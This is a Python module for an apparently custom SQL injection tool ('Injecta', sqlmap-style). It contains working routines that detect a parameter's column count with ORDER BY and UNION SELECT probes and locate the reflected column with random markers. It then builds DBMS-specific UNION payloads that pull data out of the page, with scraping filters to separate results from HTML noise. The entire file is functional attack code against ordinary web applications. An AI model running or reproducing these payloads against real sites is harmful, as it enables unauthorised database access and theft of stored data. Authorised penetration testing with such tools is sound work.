"""
Injecta — Shared extraction utilities (sqlmap-style)
DBMS-aware marker concatenation, column count detection, position detection
"""
import re
import random
import string
import urllib.parse


MARKER = "@@KRYNN@@"

SQL_ERROR_PATTERNS = re.compile(
    r'(You have an error in your SQL syntax|'
    r'Warning.*mysql_fetch|Warning.*MySQL|'
    r'mysql_fetch_array|mysql_fetch_assoc|'
    r'ORA-\d{5}|'
    r'MSSQL|SQL Server Driver|'
    r'Unclosed quotation mark|'
    r'Incorrect syntax near|'
    r'Column count doesn\'t match|'
    r'number of columns|different number of columns|'
    r'ORDER BY position.*is not in select list|'
    r'Unknown column.*in \'order clause\'|'
    r'PG::SyntaxError|PostgreSQL.*ERROR|'
    r'syntax error at or near|'
    r'no such table|no such column|'
    r'Unrecognized statement type)',
    re.I
)

HTML_TOKENS = {
    'div', 'span', 'a', 'href', 'class', 'id', 'style', 'script', 'body',
    'html', 'head', 'meta', 'title', 'link', 'img', 'src', 'width', 'height',
    'type', 'text', 'value', 'name', 'form', 'input', 'submit', 'button',
    'table', 'tr', 'td', 'th', 'br', 'hr', 'p', 'h1', 'h2', 'h3',
    'strong', 'em', 'b', 'i', 'u', 'font', 'center', 'align',
    'border', 'margin', 'padding', 'color', 'background',
    'display', 'position', 'flex', 'grid', 'inline', 'block',
    'http', 'https', 'www', 'com', 'org', 'net', 'true', 'false',
    'null', 'undefined', 'nan', 'function', 'var', 'let', 'const',
    'return', 'if', 'else', 'for', 'while', 'switch', 'case', 'break',
    'date', 'array', 'object', 'string', 'number', 'boolean',
    'math', 'json', 'console', 'window', 'document', 'navigator',
    'location', 'history', 'screen', 'fetch', 'cookie',
    'select', 'from', 'where', 'and', 'or', 'as', 'on', 'union',
    'information_schema', 'table_name', 'column_name',
    'table_schema', 'ordinal_position', 'character_maximum_length',
    'is_nullable', 'data_type', 'table_catalog', 'table_type',
    'is_updatable', 'column_default',
    'xml', 'xhtml', 'doctype', 'public', 'svg', 'path', 'g', 'd',
    'admin', 'login', 'logout', 'register', 'user', 'password', 'pass',
    'search', 'index', 'home', 'main', 'content', 'footer',
    'header', 'nav', 'menu', 'tab', 'active', 'hover', 'focus',
    'visited', 'link', 'first', 'last', 'even', 'odd',
    'colgroup', 'thead', 'tbody', 'tfoot', 'caption',
    'legend', 'label', 'fieldset', 'optgroup', 'option',
    'datalist', 'output', 'progress', 'meter', 'details',
    'summary', 'dialog', 'slot', 'template', 'canvas',
    'figure', 'figcaption', 'picture', 'source', 'video',
    'audio', 'track', 'iframe', 'embed', 'object', 'param',
    'noscript', 'annotation', 'math',
    'async', 'config', 'arguments', 'datalayer', 'gtag',
    'initial-scale', 'utf-8', 'charset', 'viewport', 'edge',
    'x-ua-compatible', 'ie', 'lang', 'en', 'keywords',
    'description', 'push', 'js', 'css3', 'html5',
    'device-width', 'google', 'tag', 'manager',
    'js15', 'histats', 'track_hits', 'track',
    'catch', 'appendchild', 'getelementbytagname',
    'createelement', 'fasi', 'try', 'sstatic1',
}

ADDITIONAL_FILTERS = re.compile(
    r'(^https?://|^www\.|\.(com|org|net|mx)$|'
    r'[{}<>=]|^[0-9]+$|^[a-f0-9]{24,}$)',
    re.I
)


def split_groupped(raw: str) -> list:
    parts = re.split(r'[,|;]\s*', raw)
    return [p.strip() for p in parts if p.strip()]


def concat_marker(dbms: str = "") -> str:
    dbms_lower = dbms.lower() if dbms else ""
    if dbms_lower == "mysql":
        return f"concat('{MARKER}',(%s),'{MARKER}')"
    elif dbms_lower == "mssql":
        return f"'{MARKER}'+(%s)+'{MARKER}'"
    else:
        return f"'{MARKER}'||(%s)||'{MARKER}'"


def extract_orig_val(url: str, param: str) -> str:
    if not url or "?" not in url:
        return ""
    qs = url.split("?", 1)[1]
    parsed = urllib.parse.parse_qs(qs)
    if param in parsed and parsed[param]:
        return parsed[param][0]
    return ""


def _test_orderby(req, url, param, orig, max_cols=1024):
    low, high = 1, max_cols
    while low < high:
        mid = (low + high) // 2
        payloads = [
            f"{orig} ORDER BY {mid}-- -",
            f"{orig}' ORDER BY {mid}-- -",
            f'{orig}" ORDER BY {mid}-- -',
            f"{orig}) ORDER BY {mid}-- -",
        ]
        has_error = False
        for p in payloads:
            try:
                _, resp_text, _ = req.test_raw(url, p, param)
                if resp_text and SQL_ERROR_PATTERNS.search(resp_text[:500]):
                    has_error = True
                    break
            except:
                continue
        if has_error:
            high = mid
        else:
            low = mid + 1
    if low <= 1:
        return 0
    return low - 1


def detect_column_count(req, url, param, max_cols=1024):
    orig = extract_orig_val(url, param) or "1"
    cols = _test_orderby(req, url, param, orig, max_cols)
    if cols > 0:
        return cols

    boundaries = [
        f"{orig}' UNION SELECT {{vals}}-- -",
        f"{orig} UNION SELECT {{vals}}",
        f'{orig}" UNION SELECT {{vals}}-- -',
        f"{orig}) UNION SELECT {{vals}}-- -",
    ]

    plen_baseline = None
    for tmpl in boundaries:
        _, resp_text, _ = req.test_raw(url, tmpl.format(vals="NULL"), param)
        if resp_text:
            plen_baseline = len(resp_text)
            break

    if plen_baseline is None:
        return 1

    upper = 2
    while upper <= max_cols * 2:
        vals = ",".join(["NULL"] * upper)
        for tmpl in boundaries:
            _, resp_text, _ = req.test_raw(url, tmpl.format(vals=vals), param)
            if resp_text and abs(len(resp_text) - plen_baseline) > 10:
                low, high = upper // 2, upper
                while low < high:
                    mid = (low + high) // 2
                    vals2 = ",".join(["NULL"] * mid)
                    found = False
                    for tmpl2 in boundaries:
                        _, rt, _ = req.test_raw(url, tmpl2.format(vals=vals2), param)
                        if rt and abs(len(rt) - plen_baseline) > 10:
                            found = True
                            break
                    if found:
                        high = mid
                    else:
                        low = mid + 1
                return max(low, 1)
        upper *= 2
        if upper > 2048:
            break
    return 1


def detect_column_position(req, url, param, col_count, marker=None):
    orig = extract_orig_val(url, param)
    if marker is None:
        marker = ''.join(random.choices(string.ascii_uppercase, k=8))
    for pos in range(1, col_count + 1):
        cols = []
        for j in range(1, col_count + 1):
            cols.append(f"'{marker}'" if j == pos else "NULL")
        prefix = f"{orig}'" if orig else "'"
        payload = f"{prefix} UNION SELECT {','.join(cols)}-- -"
        try:
            _, resp_text, _ = req.test_raw(url, payload, param)
            if resp_text and marker in resp_text:
                return pos
        except:
            continue
    return 1


def build_union_payload(sql, col_count, data_pos=1, marker=None, dbms="", orig_val=""):
    if marker:
        expr = concat_marker(dbms) % sql
    else:
        expr = f"({sql})"

    prefix = f"{orig_val}'" if orig_val else "'"

    if col_count <= 1:
        if marker:
            return f"{prefix} UNION SELECT {expr}-- -"
        return f"{prefix} UNION {sql}-- -"

    cols = []
    for i in range(1, col_count + 1):
        cols.append(expr if i == data_pos else "NULL")
    return f"{prefix} UNION SELECT {','.join(cols)}-- -"


def extract_with_marker(req, url, param, sql, col_count=1, data_pos=1, dbms=""):
    orig_val = extract_orig_val(url, param)
    payload = build_union_payload(sql, col_count, data_pos, MARKER, dbms, orig_val)
    try:
        _, resp_text, _ = req.test_raw(url, payload, param)
    except:
        return []

    if not resp_text:
        return []

    if SQL_ERROR_PATTERNS.search(resp_text[:500]):
        return []

    results = []
    parts = resp_text.split(MARKER)
    for i in range(1, len(parts), 2):
        val = parts[i].strip()
        if val:
            results.append(val)
    return list(dict.fromkeys(results))[:200]


def _is_html_noise(candidate: str) -> bool:
    if len(candidate) <= 2:
        return True
    if candidate.isdigit():
        return True
    low = candidate.lower()
    if low in HTML_TOKENS:
        return True
    if ADDITIONAL_FILTERS.search(candidate):
        return True
    if any(ch in candidate for ch in '={}<>"`'):
        return True
    return False


def extract_clean(req, url, param, sql, col_count=1, data_pos=1, dbms=""):
    results = extract_with_marker(req, url, param, sql, col_count, data_pos, dbms)
    if results:
        return results

    orig_val = extract_orig_val(url, param)
    payload = build_union_payload(sql, col_count, data_pos, dbms=dbms, orig_val=orig_val)
    try:
        _, resp_text, _ = req.test_raw(url, payload, param)
    except:
        return []

    if not resp_text or len(resp_text) < 20:
        return []

    if SQL_ERROR_PATTERNS.search(resp_text[:500]):
        return []

    candidates = re.findall(r'(\w[\w$#@.\-]+)', resp_text)
    if not candidates:
        return []

    seen = set()
    result = []
    for c in candidates:
        c = c.strip().strip('.,;:!?\'"')
        if not c:
            continue
        if _is_html_noise(c):
            continue
        if c not in seen:
            seen.add(c)
            result.append(c)
    return result[:100]
